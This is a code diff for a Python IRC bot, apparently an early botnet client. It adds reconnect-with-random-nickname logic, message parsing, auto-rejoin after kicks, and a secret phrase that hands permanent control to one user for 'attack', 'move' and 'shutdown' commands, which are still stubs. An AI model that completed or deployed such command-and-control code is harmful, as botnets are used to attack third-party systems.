@@ -19,63 +19,76 @@ class PyBot:
     self.controlMode = 0 #default 0 = bot not being controller
     self.controllerName = ""
 
-    try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
-      self.s = s.connect((host,int(port)))
-      s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
-      s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
-    except:
-      print("unable to connect to irc server")
-
-    try:
-      s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
-    except:
-      print("DEBUG --> unable to join channnel on server")
-     
+    while True:
+      try:
+        self.s = s.connect((host,int(port)))  
+        s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
+        s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
+        break
+      except:
+        print("DEBUG --> Unable to connect to irc server")
+        self.nick = self.generateRandomName()
+    s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel once server connect succeeds
+ 
+  #Listen for incoming data from the IRC server
   def listen(self):
+
     while True:
       data = ""
       data = s.recv(4096).decode("UTF-8")
       data = data.strip("\n\r")
-      print("DEBUG --> data recieved: " + data)
+      dataLen = len(data.split()) #Split on white space
+ 
+      #EX dataLen = 2 --> PING :sinisalo.freenode.net
+      #we are interested in data.split index 0 (PING)
+      if (data.split()[0] == "PING" and dataLen == 2):
+        print("DEBUG --> data recieved: PING REQUEST")
+        s.send(bytes("PONG :pingis\n","UTF-8")) 
 
-      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
-        s.send(bytes("PONG :pingis\n","UTF-8"))
-
-      elif data.find("PRIVMSG") != -1:
-        temp = data.split("!")
-        user = temp[0][1:] #extract and trim user from temp
-        temp = data.split("PRIVMSG")
-        temp2 = temp[1].split(":")
-        message = temp2[1]
-        self.examinePrivmsg(user,message)
-
-      elif data.find("KICK :") != -1:
-          s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
-
-  def examinePrivmsg(self,user,message):
-    
-    print("DEBUG --> "+user+" says:"+message)
-
-    if message == secret and self.controlMode == 0:
+      #Example $:causingchaos!~chaos@d75-155-72-40.abhsia.telus.net PRIVMSG #Windows95xx :jesus
+      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'PRIVMSG', '#Windows95xx', ':jesus']
+      # len >= 4  we are interested in data at index 1
+      elif data.split()[1] == "PRIVMSG" and ( dataLen == 4 or dataLen == 5 ): 
+        print("DEBUG --> PRIVMSG/data recieved: ")
+        senderDetails = data.split()[0].split(":")[1]
+        senderNick = senderDetails.split("!")[0]
+        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
+        temp = data.split("PRIVMSG")[1].split(":")
+        senderMessage = temp[1]
+        self.examinePrivmsg(senderNick,senderMessage)
+      
+      #Example: $:causingchaos!~chaos@d75-155-72-40.abhsia.telus.net KICK #Windows95xx VWD0U52I VWD0U52I
+      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'KICK', '#Windows95xx', 'D2JFX0QV', ':get', 'out'] len=6
+      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'KICK', '#Windows95xx', 'VWD0U52I', ':VWD0U52I']  len=5
+      #kicks with or without reason.
+      elif data.split()[1] == "KICK" and (dataLen == 5 or dataLen == 6):
+        print("DEBUG --> KICK data recieved: ")
+        print( str(data.split()) )
+        s.send(bytes("JOIN " + channel + "\n", "UTF-8"))
+                                        
+  def examinePrivmsg(self,senderNick,senderMessage):
+    print("DEBUG --> "+senderNick+" says:"+senderMessage)
+    #This locks the bot permantely to the controller, if secret is entered again it will be ignored
+    if senderMessage == secret and self.controlMode == 0:
       print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
       self.controlMode = 1
-      self.controllerName = user
-    
-    elif self.controlMode == 1 and user == self.controllerName: 
+      self.controllerName = senderNick
+    #If controlMode is ennabled, and message sender private/or public enters the command, the bot will respond
+    elif self.controlMode == 1 and senderNick == self.controllerName: 
 # NOTE --> The 'attack' and 'move' messages will be followed by who to attack and where to move to, so the tests will have to be .startswith()
-      if message == "status":
-        print("DEBUG --> status requested by controller")
-      elif message == "attack":
+      if senderMessage == "status":
+        print("DEBUG --> status requested by controller, sending This Bot Nick via Private Message")
+        outMessage = "BotName$$: "+self.nick #parse this on delimiter $$
+        #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends to channel
+        s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
+      elif senderMessage == "attack":
         print("DEBUG --> attack requested by controller")
-      elif message == "move":
+      elif senderMessage == "move":
         print("DEBUG --> move requested by controller")
-      elif message == "quit":
+      elif senderMessage == "quit":
         print("DEBUG --> move requested by controller")
-      elif message == "shutdown":
+      elif senderMessage == "shutdown":
         print("DEBUG --> move requested by controller")
-
-  def changeChannel(self,newChannel):
-    print("DEBUG --> Changing channel")     
 
   def generateRandomName(self):
     #randomName = "Bot" + random.choice(string.digits) + random.choice(string.digits)
